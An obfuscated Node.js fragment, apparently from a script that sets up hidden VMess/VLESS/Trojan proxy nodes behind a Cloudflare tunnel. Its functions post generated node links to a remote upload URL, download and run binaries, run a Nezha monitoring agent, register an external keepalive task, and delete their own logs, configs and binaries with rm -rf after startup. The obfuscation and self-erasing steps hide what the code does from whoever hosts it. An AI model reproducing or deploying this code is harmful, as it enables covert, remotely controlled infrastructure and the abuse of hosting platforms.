_0x537cd8={_0x4eee9f:0x25c,_0x12af8a:0x23f,_0x1609e3:0x280,_0x308eeb:0x211,_0x1f5d43:0x222,_0x1a1091:0x24b,_0x45cf1b:0x1f1,_0x1da988:0x265,_0xa1ee51:0x202,_0x47185e:0x24b,_0x727b5a:0x201,_0x287836:0x276},_0x10fe43=await _0x579469(),_0x45bc52=NAME?NAME+'-'+_0x10fe43:_0x10fe43;return new Promise(_0x324a80=>{const _0xe1f866={_0x239286:0x211,_0xc24f8a:0x24b,_0xb89194:0x26b};setTimeout(()=>{const _0x4cb65b=_0x227a,_0x3a1204={'v':'2','ps':''+_0x45bc52,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4cb65b(0x228),'net':'ws','type':'none','host':_0x29ad50,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x29ad50,'alpn':'','fp':_0x4cb65b(_0x537cd8._0x4eee9f)},_0x4bb500=_0x4cb65b(0x1ee)+UUID+'@'+CFIP+':'+CFPORT+_0x4cb65b(_0x537cd8._0x12af8a)+_0x29ad50+_0x4cb65b(_0x537cd8._0x1609e3)+_0x29ad50+_0x4cb65b(0x241)+_0x45bc52+_0x4cb65b(0x1d4)+Buffer[_0x4cb65b(_0x537cd8._0x308eeb)](JSON[_0x4cb65b(_0x537cd8._0x1f5d43)](_0x3a1204))[_0x4cb65b(_0x537cd8._0x1a1091)](_0x4cb65b(0x25e))+_0x4cb65b(0x1e3)+UUID+'@'+CFIP+':'+CFPORT+_0x4cb65b(_0x537cd8._0x45cf1b)+_0x29ad50+_0x4cb65b(_0x537cd8._0x1609e3)+_0x29ad50+_0x4cb65b(_0x537cd8._0x1da988)+_0x45bc52+_0x4cb65b(0x20e);console[_0x4cb65b(0x201)](Buffer['from'](_0x4bb500)[_0x4cb65b(_0x537cd8._0x1a1091)](_0x4cb65b(0x25e))),fs[_0x4cb65b(_0x537cd8._0xa1ee51)](subPath,Buffer[_0x4cb65b(0x211)](_0x4bb500)[_0x4cb65b(_0x537cd8._0x47185e)]('base64')),console[_0x4cb65b(_0x537cd8._0x727b5a)](FILE_PATH+_0x4cb65b(_0x537cd8._0x287836)),uploadNodes(),app[_0x4cb65b(0x1f0)]('/'+SUB_PATH,(_0x2e0b63,_0x1b10e4)=>{const _0x1f108d=_0x4cb65b,_0x4ee3c0=Buffer[_0x1f108d(_0xe1f866._0x239286)](_0x4bb500)[_0x1f108d(_0xe1f866._0xc24f8a)]('base64');_0x1b10e4[_0x1f108d(_0xe1f866._0xb89194)](_0x1f108d(0x253),_0x1f108d(0x267)),_0x1b10e4[_0x1f108d(0x209)](_0x4ee3c0);}),_0x324a80(_0x4bb500);},0x7d0);});}}async function uploadNodes(){const _0x121530={_0x4a4059:0x1cc,_0x175e48:0x207,_0x15f1c6:0x1d3,_0x127f58:0x27e,_0x3fe86d:0x24a,_0x2cc915:0x210,_0x1050b4:0x1f7,_0x34cf92:0x201,_0x510436:0x1cd},_0x9d3890=_0x59e5e1;if(UPLOAD_URL&&PROJECT_URL){const _0x3a2ed5=PROJECT_URL+'/'+SUB_PATH,_0x2b14f1={'subscription':[_0x3a2ed5]};try{const _0x21d586=await axios[_0x9d3890(0x1f7)](UPLOAD_URL+_0x9d3890(0x258),_0x2b14f1,{'headers':{'Content-Type':'application/json'}});return _0x21d586&&_0x21d586['status']===0xc8?(console[_0x9d3890(0x201)](_0x9d3890(_0x121530._0x4a4059)),_0x21d586):null;}catch(_0x4c6d8c){if(_0x4c6d8c['response']){if(_0x4c6d8c[_0x9d3890(_0x121530._0x175e48)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x9d3890(_0x121530._0x15f1c6)](listPath))return;const _0x54e75b=fs[_0x9d3890(_0x121530._0x127f58)](listPath,_0x9d3890(_0x121530._0x3fe86d)),_0x2b1cb5=_0x54e75b['split']('\x0a')[_0x9d3890(_0x121530._0x2cc915)](_0x57d35d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x9d3890(0x1e5)](_0x57d35d));if(_0x2b1cb5['length']===0x0)return;const _0x240773=JSON['stringify']({'nodes':_0x2b1cb5});try{const _0x3d54c8=await axios[_0x9d3890(_0x121530._0x1050b4)](UPLOAD_URL+_0x9d3890(0x1cf),_0x240773,{'headers':{'Content-Type':'application/json'}});return _0x3d54c8&&_0x3d54c8['status']===0xc8?(console[_0x9d3890(_0x121530._0x34cf92)](_0x9d3890(_0x121530._0x510436)),_0x3d54c8):null;}catch(_0x5cb5d0){return null;}}else return;}}function cleanFiles(){const _0x2d75ba={_0x31d94d:0x254,_0xe043c3:0x22e},_0x4ceb43={_0x169f3d:0x201};setTimeout(()=>{const _0x2a8ba5={_0x6ce379:0x1c7},_0xb19522=_0x227a,_0x40467b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x40467b[_0xb19522(_0x2d75ba._0x31d94d)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x40467b[_0xb19522(0x254)](phpPath);process[_0xb19522(0x1c1)]==='win32'?exec(_0xb19522(0x240)+_0x40467b[_0xb19522(0x1d6)]('\x20')+_0xb19522(0x1c3),_0x35650c=>{const _0x24720e=_0xb19522;console[_0x24720e(0x23e)](),console[_0x24720e(0x201)]('App\x20is\x20running'),console[_0x24720e(_0x4ceb43._0x169f3d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x40467b[_0xb19522(0x1d6)]('\x20')+_0xb19522(_0x2d75ba._0xe043c3),_0x18e269=>{const _0x5da15b=_0xb19522;console['clear'](),console[_0x5da15b(0x201)]('App\x20is\x20running'),console['log'](_0x5da15b(_0x2a8ba5._0x6ce379));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x360147={_0x3b1056:0x201,_0x4b78a4:0x23d},_0x27cb58=_0x59e5e1;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x27cb58(_0x360147._0x3b1056)](_0x27cb58(0x215));return;}try{const _0x37cea9=await axios[_0x27cb58(0x1f7)](_0x27cb58(0x1f4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x27cb58(_0x360147._0x4b78a4)}});return console[_0x27cb58(0x201)]('automatic\x20access\x20task\x20added\x20successfully'),_0x37cea9;}catch(_0x27d1e7){return console[_0x27cb58(0x256)](_0x27cb58(0x225)+_0x27d1e7['message']),null;}}async function startserver(){const _0x4605f6={_0x2f8386:0x256},_0xa1e11c=_0x59e5e1;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2e8990){console[_0xa1e11c(_0x4605f6._0x2f8386)](_0xa1e11c(0x1c9),_0x2e8990);}}startserver()['catch'](_0x3e2d22=>{const _0x476e2d={_0x244418:0x256,_0x4ba57d:0x22b},_0x13fd4b=_0x59e5e1;console[_0x13fd4b(_0x476e2d._0x244418)](_0x13fd4b(_0x476e2d._0x4ba57d),_0x3e2d22);}),app[_0x59e5e1(0x266)](PORT,()=>console[_0x59e5e1(0x201)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
